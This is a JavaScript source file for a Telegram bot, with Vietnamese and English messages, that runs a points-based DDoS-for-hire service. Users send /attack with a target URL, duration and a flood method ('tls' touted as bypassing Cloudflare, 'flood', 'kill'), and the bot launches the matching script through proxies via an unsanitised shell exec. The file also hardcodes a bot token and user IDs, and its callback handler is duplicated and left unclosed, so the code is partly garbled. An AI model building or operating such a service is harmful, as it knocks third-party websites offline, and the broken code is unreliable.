const TelegramBot = require("node-telegram-bot-api");
const Database = require("better-sqlite3");
const si = require("systeminformation");
const { exec } = require("child_process");

const token = "7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc";
const bot = new TelegramBot(token, { polling: true });
const admins = [6601930239, 1848131455];
const subAdmins = [7245377580, 7566935490];
const groupId = -1002370415846;
const requiredGroup = -1002370415846;
const requiredChannel = -1002511070831;
const methods = ["tls", "flood", "kill"];
const db = Database("bot.db");

const messages = {
    vi: {
        start: `**Lệnh của Bot:**\n• /methods -> Xem danh sách methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Bật hoặc tắt chức năng bảo trì Bot (admin only)\n• /ongoing -> Xem slot đang hoạt động\n• /system -> Xem thông tin hệ thống\n• /daily -> Điểm danh nhận 300 điểm\n• /stats -> Xem thống kê sử dụng bot`,
        methods: `**Method hiện có:**\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass`,
        notMember: `Bạn cần tham gia nhóm và kênh để sử dụng bot!`,
        adminNoCheckin: "Admin và SubAdmin không cần điểm danh!",
        alreadyCheckedIn: "Bạn đã điểm danh hôm nay rồi!",
        checkinSuccess: "Đã cộng 300 điểm cho bạn.\nSố điểm hiện tại: {points}",
        noPermission: "Bạn không có quyền sử dụng lệnh này.",
        blacklistCurrent: "**Blacklist hiện tại:**\n{list}",
        blacklistEmpty: "Không có keyword nào.",
        blacklistAdded: "Đã thêm `{keyword}` vào blacklist",
        blacklistExists: "Từ khóa `{keyword}` đã có trong blacklist.",
        blacklistRemoved: "Đã xoá `{keyword}` khỏi blacklist",
        blacklistNotExists: "Từ khóa `{keyword}` không có trong blacklist.",
        maintenanceToggle: "**Bảo trì:** **{status}**",
        noOngoingSlots: "Hiện không có slot nào đang hoạt động.\nSố slot trống: {available}/{max}",
        ongoingAttacks: "**Ongoing Attacks:**\n{attacks}\n\nSlot trống: {available}/{max}",
        attackSyntax: "Cú pháp: /attack [url] [method] [time] [-r rate] [-t threads]\nVD: /attack https://abc.com method -r 64 -t 8\nLưu ý: Min time 10s, max time 120s. Gói free không custom được rate(-r) và thread(-t), gõ /methods để xem method. Mỗi lần attack trừ 100 điểm.",
        maintenance: "Bot đang bảo trì, vui lòng thử lại sau.",
        invalidMethod: "Method không hợp lệ.",
        blacklistedUrl: "URL này nằm trong blacklist.",
        minTime: "Thời gian tối thiểu là 10s.",
        maxAttacks: "Bạn đã sử dụng hết 10 lượt attack trong ngày.",
        notEnoughPoints: "Bạn không đủ điểm để thực hiện attack. Cần ít nhất 100 điểm.",
        noSlotsAvailable: "Hiện không còn slot trống, vui lòng thử lại sau.",
        cooldownWait: "Vui lòng đợi {seconds}s trước khi gửi attack tiếp theo.",
        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Thời gian:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`",
        slotCompleted: "Đã có slot mới.\nSố slot hiện tại: {active}/{max}.",
        error: "Lỗi: `{error}`",
        completed: "Hoàn thành!\n```\n{output}\n```",
        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB",
        stats: "**Thống kê lượt sử dụng Bot:**\n{list}",
        attackNotification: "{fullName} Sent Attack\n**Method:** {method}\n**Rate:** {rate}\n**Thread:** {threads}\n**Time:** {time}s\n**Slot:** {slot}"
    },
    en: {
        start: `**Bot Commands:**\n• /methods -> View available methods\n• /attack [url] [method] [time] [-r rate] [-t threads]\n• /blacklist [add/remove] [keyword] (admin only)\n• /maintenance -> Toggle bot maintenance mode (admin only)\n• /ongoing -> View active slots\n• /system -> View system information\n• /daily -> Daily check-in for 300 points\n• /stats -> View bot usage statistics`,
        methods: `**Available Methods:**\n• tls -> Send cloudflare\n• flood -> Version 1, stable requests\n• kill -> Powerful but no bypass`,
        notMember: `You need to join group and channel to use this bot!`,
        adminNoCheckin: "Admins and SubAdmins don't need daily check-in!",
        alreadyCheckedIn: "You have already checked in today!",
        checkinSuccess: "Added 300 points to your account.\nCurrent points: {points}",
        noPermission: "You don't have permission to use this command.",
        blacklistCurrent: "**Current Blacklist:**\n{list}",
        blacklistEmpty: "No keywords found.",
        blacklistAdded: "Added `{keyword}` to blacklist",
        blacklistExists: "Keyword `{keyword}` already exists in blacklist.",
        blacklistRemoved: "Removed `{keyword}` from blacklist",
        blacklistNotExists: "Keyword `{keyword}` not found in blacklist.",
        maintenanceToggle: "**Maintenance:** **{status}**",
        noOngoingSlots: "No active slots currently.\nAvailable slots: {available}/{max}",
        ongoingAttacks: "**Ongoing Attacks:**\n{attacks}\n\nAvailable slots: {available}/{max}",
        attackSyntax: "Syntax: /attack [url] [method] [time] [-r rate] [-t threads]\nExample: /attack https://abc.com method -r 64 -t 8\nNote: Min time 10s, max time 120s. Free package cannot customize rate(-r) and threads(-t), type /methods to view methods. Each attack costs 100 points.",
        maintenance: "Bot is under maintenance, please try again later.",
        invalidMethod: "Invalid method.",
        blacklistedUrl: "This URL is blacklisted.",
        minTime: "Minimum time is 10s.",
        maxAttacks: "You have used all 10 attacks for today.",
        notEnoughPoints: "You don't have enough points to perform attack. Need at least 100 points.",
        noSlotsAvailable: "No slots available, please try again later.",
        cooldownWait: "Please wait {seconds}s before sending next attack.",
        attackSent: "**Attack sent!**\n\n**URL:** `{url}`\n**Method:** `{method}`\n**Time:** `{time}s`\n**Rate:** `{rate}`\n**Threads:** `{threads}`",
        slotCompleted: "New slot available.\nCurrent slots: {active}/{max}.",
        error: "Error: `{error}`",
        completed: "Completed!\n```\n{output}\n```",
        systemInfo: "**System Information:**\n\n**CPU:** {cpu}\n**OS Name:** {os}\n**Total RAM:** {totalRam} GB\n**Free RAM:** {freeRam} GB\n**Used Disk:** {usedDisk} GB\n**Total Disk:** {totalDisk} GB",
        stats: "**Bot Usage Statistics:**\n{list}",
        attackNotification: "{fullName} Sent Attack\n**Method:** {method}\n**Rate:** {rate}\n**Thread:** {threads}\n**Time:** {time}s\n**Slot:** {slot}"
    }
};

db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, fullName TEXT, PRIMARY KEY(userId, url, method));
CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT, totalAttacks INTEGER DEFAULT 0);`);

const getSetting = db.prepare("SELECT value FROM settings WHERE key=?");
const setSetting = db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)");
const getAllBlacklist = db.prepare("SELECT keyword FROM blacklist");
const addBlacklist = db.prepare("INSERT OR IGNORE INTO blacklist (keyword) VALUES (?)");
const removeBlacklist = db.prepare("DELETE FROM blacklist WHERE keyword=?");
const getAllSlots = db.prepare("SELECT * FROM slots");
const addSlot = db.prepare("INSERT INTO slots (userId, url, method, endTime, fullName) VALUES (?, ?, ?, ?, ?)");
const removeSlot = db.prepare("DELETE FROM slots WHERE userId=? AND url=? AND method=?");
const removeExpiredSlots = db.prepare("DELETE FROM slots WHERE endTime <= ?");
const getUser = db.prepare("SELECT * FROM users WHERE userId=?");
const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate, totalAttacks) VALUES (?, 0, '', 0, '', 0)");
const updateUserPoints = db.prepare("UPDATE users SET points=? WHERE userId=?");
const updateUserCheckin = db.prepare("UPDATE users SET lastCheckin=? WHERE userId=?");
const updateUserAttacks = db.prepare("UPDATE users SET attacksToday=?, lastAttackDate=? WHERE userId=?");
const incrementTotalAttacks = db.prepare("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE userId=?");
const getTopUsers = db.prepare("SELECT userId, totalAttacks FROM users WHERE totalAttacks > 0 ORDER BY totalAttacks DESC LIMIT 20");

if (!getSetting.get("maintenance")) setSetting.run("maintenance", "false");
if (!getSetting.get("activeSlots")) setSetting.run("activeSlots", "0");
setSetting.run("activeSlots", "0");

let maintenance = getSetting.get("maintenance").value === "true";
let blacklist = getAllBlacklist.all().map(r => r.keyword);
let activeSlots = parseInt(getSetting.get("activeSlots").value);
const maxSlots = 1;
let lastAttackTime = 0;
const cooldown = 60000;

function syncSlotsFromDb() {
    removeExpiredSlots.run(Math.floor(Date.now() / 1000));
    activeSlots = getAllSlots.all().length;
    setSetting.run("activeSlots", activeSlots.toString());
}

function getFullName(user) {
    let name = user.first_name || "";
    if (user.last_name) name += " " + user.last_name;
    return name || user.username || "Unknown";
}

function getTodayString() {
    return new Date().toISOString().split('T')[0];
}

function isAdmin(userId) {
    return admins.includes(userId);
}

function isSubAdmin(userId) {
    return subAdmins.includes(userId);
}

function getMessage(key, lang = 'vi', replacements = {}) {
    let message = messages[lang][key] || messages['vi'][key];
    Object.keys(replacements).forEach(placeholder => {
        message = message.replace(new RegExp(`{${placeholder}}`, 'g'), replacements[placeholder]);
    });
    return message;
}

function createTranslateButton() {
    return {
        reply_markup: {
            inline_keyboard: [[
                { text: "Translate To English </>", callback_data: "translate_en" }
            ]]
        }
    };
}

async function checkMembership(userId) {
    if (isAdmin(userId) || isSubAdmin(userId)) return true;
    
    try {
        await bot.getChatMember(requiredGroup, userId);
        await bot.getChatMember(requiredChannel, userId);
        return true;
    } catch (error) {
        return false;
    }
}

function resetDailyAttacks() {
    const today = getTodayString();
    const users = db.prepare("SELECT userId, lastAttackDate FROM users").all();
    users.forEach(user => {
        if (user.lastAttackDate !== today) {
            updateUserAttacks.run(0, today, user.userId);
        }
    });
}

async function isAllowed(chatId, userId) {
    if (isAdmin(userId) || isSubAdmin(userId)) return true;
    if (chatId !== groupId) return false;
    return await checkMembership(userId);
}

syncSlotsFromDb();

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    addUser.run(userId);
    bot.sendMessage(chatId, getMessage('start'), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/methods/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    bot.sendMessage(chatId, getMessage('methods'), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/daily/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    if (isAdmin(userId) || isSubAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('adminNoCheckin'), createTranslateButton());
        return;
    }
    
    addUser.run(userId);
    const user = getUser.get(userId);
    const today = getTodayString();
    
    if (user.lastCheckin === today) {
        bot.sendMessage(chatId, getMessage('alreadyCheckedIn'), createTranslateButton());
        return;
    }
    
    const newPoints = user.points + 300;
    updateUserPoints.run(newPoints, userId);
    updateUserCheckin.run(today, userId);
    bot.sendMessage(chatId, getMessage('checkinSuccess', 'vi', { points: newPoints }), createTranslateButton());
});

bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    const topUsers = getTopUsers.all();
    let statsText = "";
    
    if (topUsers.length === 0) {
        statsText = "Chưa có thống kê nào.";
    } else {
        for (let i = 0; i < topUsers.length; i++) {
            const user = topUsers[i];
            try {
                const chatMember = await bot.getChatMember(groupId, user.userId);
                const fullName = getFullName(chatMember.user);
                statsText += `${i + 1}. ${fullName} - ${user.totalAttacks} lần\n`;
            } catch (error) {
                statsText += `${i + 1}. Unknown User - ${user.totalAttacks} lần\n`;
            }
        }
    }
    
    bot.sendMessage(chatId, getMessage('stats', 'vi', { list: statsText }), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
        return;
    }
    
    const bl = getAllBlacklist.all().map(r => r.keyword);
    const listText = bl.length ? bl.map(k => `- \`${k}\``).join("\n") : getMessage('blacklistEmpty');
    bot.sendMessage(chatId, getMessage('blacklistCurrent', 'vi', { list: listText }), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
        return;
    }
    
    const action = match[1];
    const keyword = match[2].trim();
    
    if (action === "add") {
        if (!blacklist.includes(keyword)) {
            blacklist.push(keyword);
            addBlacklist.run(keyword);
            bot.sendMessage(chatId, getMessage('blacklistAdded', 'vi', { keyword }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        } else {
            bot.sendMessage(chatId, getMessage('blacklistExists', 'vi', { keyword }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        }
    } else if (action === "remove") {
        if (blacklist.includes(keyword)) {
            blacklist = blacklist.filter(k => k !== keyword);
            removeBlacklist.run(keyword);
            bot.sendMessage(chatId, getMessage('blacklistRemoved', 'vi', { keyword }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        } else {
            bot.sendMessage(chatId, getMessage('blacklistNotExists', 'vi', { keyword }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        }
    }
});

bot.onText(/\/maintenance/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
        return;
    }
    
    maintenance = !maintenance;
    setSetting.run("maintenance", maintenance ? "true" : "false");
    const status = maintenance ? 'Bật' : 'Tắt';
    bot.sendMessage(chatId, getMessage('maintenanceToggle', 'vi', { status }), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/ongoing/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    syncSlotsFromDb();
    const now = Math.floor(Date.now() / 1000);
    const slots = getAllSlots.all();
    
    if (!slots.length) {
        bot.sendMessage(chatId, getMessage('noOngoingSlots', 'vi', { 
            available: maxSlots, 
            max: maxSlots 
        }), { parse_mode: "Markdown", ...createTranslateButton() });
        return;
    }
    
    let attacksText = "";
    slots.forEach((s, i) => {
        let timeLeft = s.endTime - now;
        timeLeft = timeLeft > 0 ? timeLeft : 0;
        attacksText += `\n${i + 1}. **User:** \`${s.fullName}\`\n   **URL:** \`${s.url}\`\n   **Method:** \`${s.method}\`\n   **Time left:** \`${timeLeft}s\``;
    });
    
    bot.sendMessage(chatId, getMessage('ongoingAttacks', 'vi', {
        attacks: attacksText,
        available: maxSlots - slots.length,
        max: maxSlots
    }), { parse_mode: "Markdown", ...createTranslateButton() });
});

bot.onText(/\/attack$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    bot.sendMessage(chatId, getMessage('attackSyntax'), { 
        parse_mode: "Markdown", 
        ...createTranslateButton() 
    });
});

bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    if (maintenance && !isAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('maintenance'), createTranslateButton());
        return;
    }
    
    addUser.run(userId);
    const user = getUser.get(userId);
    const today = getTodayString();
    
    resetDailyAttacks();
    
    const url = match[1];
    const method = match[2];
    let time = parseInt(match[3]);
    let rate = match[4] ? parseInt(match[4]) : 17;
    let threads = match[5] ? parseInt(match[5]) : 5;
    
    if (!methods.includes(method)) {
        bot.sendMessage(chatId, getMessage('invalidMethod'), createTranslateButton());
        return;
    }
    
    if (blacklist.some(k => url.includes(k))) {
        bot.sendMessage(chatId, getMessage('blacklistedUrl'), createTranslateButton());
        return;
    }
    
    if (time < 10) {
        bot.sendMessage(chatId, getMessage('minTime'), createTranslateButton());
        return;
    }
    
    let slotInfo = "";
    
    if (isAdmin(userId)) {
        slotInfo = "Unlimited";
    } else if (isSubAdmin(userId)) {
        if (time > 260) time = 260;
        if (user.lastAttackDate === today && user.attacksToday >= 10) {
            bot.sendMessage(chatId, getMessage('maxAttacks'), createTranslateButton());
            return;
        }
        rate = 17;
        threads = 5;
        const remainingAttacks = user.lastAttackDate === today ? 10 - user.attacksToday : 10;
        slotInfo = `${remainingAttacks - 1}/10`;
    } else {
        if (time > 60) time = 60;
        if (user.points < 100) {
            bot.sendMessage(chatId, getMessage('notEnoughPoints'), createTranslateButton());
            return;
        }
        rate = 17;
        threads = 5;
        const remainingPoints = Math.floor((user.points - 100) / 100);
        slotInfo = `${remainingPoints} attacks`;
    }
    
    syncSlotsFromDb();
    if (activeSlots >= maxSlots) {
        bot.sendMessage(chatId, getMessage('noSlotsAvailable'), createTranslateButton());
        return;
    }
    
    const now = Date.now();
    if (now - lastAttackTime < cooldown) {
        const waitTime = Math.ceil((cooldown - (now - lastAttackTime)) / 1000);
        bot.sendMessage(chatId, getMessage('cooldownWait', 'vi', { seconds: waitTime }), createTranslateButton());
        return;
    }
    
    if (!isAdmin(userId) && !isSubAdmin(userId)) {
        updateUserPoints.run(user.points - 100, userId);
    }
    
    if (isSubAdmin(userId)) {
        const newAttackCount = user.lastAttackDate === today ? user.attacksToday + 1 : 1;
        updateUserAttacks.run(newAttackCount, today, userId);
    }
    
    incrementTotalAttacks.run(userId);
    
    const endTime = Math.floor(now / 1000) + time;
    const fullName = getFullName(msg.from);
    addSlot.run(userId, url, method, endTime, fullName);
    activeSlots++;
    setSetting.run("activeSlots", activeSlots.toString());
    lastAttackTime = now;
    
    bot.sendMessage(chatId, getMessage('attackSent', 'vi', {
        url, method, time, rate, threads
    }), { parse_mode: "Markdown", ...createTranslateButton() });
    
    if (!isAdmin(userId)) {
        bot.sendMessage(groupId, getMessage('attackNotification', 'vi', {
            fullName, method, rate, threads, time, slot: slotInfo
        }), { parse_mode: "Markdown" });
    }
    
    exec(`node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`, (error, stdout, stderr) => {
        removeSlot.run(userId, url, method);
        syncSlotsFromDb();
        bot.sendMessage(groupId, getMessage('slotCompleted', 'vi', { 
            active: activeSlots, max: maxSlots 
        }), { parse_mode: "Markdown" });
        
        if (error) {
            bot.sendMessage(chatId, getMessage('error', 'vi', { error: error.message }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        } else {
            bot.sendMessage(chatId, getMessage('completed', 'vi', { output: stdout }), { 
                parse_mode: "Markdown", 
                ...createTranslateButton() 
            });
        }
    });
});

bot.onText(/\/system/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!(await isAllowed(chatId, userId))) {
        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
        return;
    }
    
    if (!isAdmin(userId)) {
        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
        return;
    }
    
    try {
        const cpu = await si.cpu();
        const osInfo = await si.osInfo();
        const mem = await si.mem();
        const disk = await si.fsSize();
        
        bot.sendMessage(chatId, getMessage('systemInfo', 'vi', {
            cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)`,
            os: osInfo.distro,
            totalRam: (mem.total / (1024 ** 3)).toFixed(2),
            freeRam: (mem.free / (1024 ** 3)).toFixed(2),
            usedDisk: (disk[0].used / (1024 ** 3)).toFixed(2),
            totalDisk: (disk[0].size / (1024 ** 3)).toFixed(2)
        }), { parse_mode: "Markdown", ...createTranslateButton() });
    } catch (e) {
        bot.sendMessage(chatId, `Error getting system info: ${e.message}`);
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    if (data === 'translate_en') {
        const originalText = message.text;
        let translatedText = originalText;
        
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    if (data === 'translate_en') {
        const originalText = message.text;
        let translatedText = originalText;
        
        Object.keys(messages.vi).forEach(key => {
            if (originalText.includes(messages.vi[key].split('\n')[0])) {
                translatedText = messages.en[key];
            }
        });
        
        try {
            await bot.editMessageText(translatedText, {
                chat_id: message.chat.id,
                message_id: message.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "Translate To Vietnamese </>", callback_data: "translate_vi" }
                    ]]
                }
            });
        } catch (error) {
            console.log('Edit message error:', error.message);
        }
    } else if (data === 'translate_vi') {
        const originalText = message.text;
        let translatedText = originalText;
        
        Object.keys(messages.en).forEach(key => {
            if (originalText.includes(messages.en[key].split('\n')[0])) {
                translatedText = messages.vi[key];
            }
        });
        
        try {
            await bot.editMessageText(translatedText, {
                chat_id: message.chat.id,
                message_id: message.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "Translate To English </>", callback_data: "translate_en" }
                    ]]
                }
            });
        } catch (error) {
            console.log('Edit message error:', error.message);
        }
    }
    
    bot.answerCallbackQuery(callbackQuery.id);
});

process.on('SIGINT', () => {
    db.close();
    process.exit(0);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
